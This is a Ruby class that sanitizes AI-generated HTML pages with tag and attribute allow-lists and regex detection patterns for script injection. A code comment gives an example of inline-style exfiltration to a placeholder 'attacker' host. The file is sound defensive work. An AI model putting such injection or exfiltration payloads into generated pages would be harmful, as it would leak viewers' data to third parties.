# frozen_string_literal: true

class Ai::PageSanitizer
  ALLOWED_TAGS = %w[
    div span p h1 h2 h3 h4 h5 h6 a img ul ol li
    section header footer nav main article aside
    strong em b i u s br hr blockquote pre code
    table thead tbody tfoot tr th td
    figure figcaption button label input select option
    svg path circle rect line polyline polygon
    details summary
  ].freeze

  HTML_ATTRIBUTES = %w[
    class id
    src href alt title target rel
    width height loading
    data-gumroad-ref data-gumroad-field data-gumroad-action
    aria-label aria-hidden role
    type name value placeholder disabled
  ].freeze

  SVG_ATTRIBUTES = %w[
    viewBox xmlns preserveAspectRatio
    d fill stroke stroke-width stroke-linecap stroke-linejoin fill-rule clip-rule
    cx cy r rx ry x y x1 y1 x2 y2 points transform
  ].freeze

  ALLOWED_ATTRIBUTES = (HTML_ATTRIBUTES + SVG_ATTRIBUTES).freeze

  DANGEROUS_PATTERNS = [
    /javascript:/i,
    /on\w+\s*=/i,        # onclick, onload, etc.
    /<script/i,
    /<\/script/i,
    /expression\s*\(/i,  # CSS expression()
    /url\s*\(\s*['"]*javascript/i,
  ].freeze

  # `style` is intentionally NOT allow-listed. Inline styles can exfiltrate data
  # via `background:url(https://attacker/leak?...)` from any non-sandboxed render
  # context (admin previews, emails, etc.). The public viewer renders inside a
  # sandboxed iframe today, but defense-in-depth: AI-generated HTML should use
  # class-based styling (Tailwind utility classes), not inline `style`.
  def self.sanitize(html)
    return "" if html.blank?

    # First pass: strip dangerous patterns
    cleaned = html.dup
    DANGEROUS_PATTERNS.each { |pattern| cleaned.gsub!(pattern, "") }

    # Second pass: use Rails sanitizer
    sanitizer = Rails::HTML5::SafeListSanitizer.new
    sanitizer.sanitize(
      cleaned,
      tags: ALLOWED_TAGS,
      attributes: ALLOWED_ATTRIBUTES,
    )
  end
end
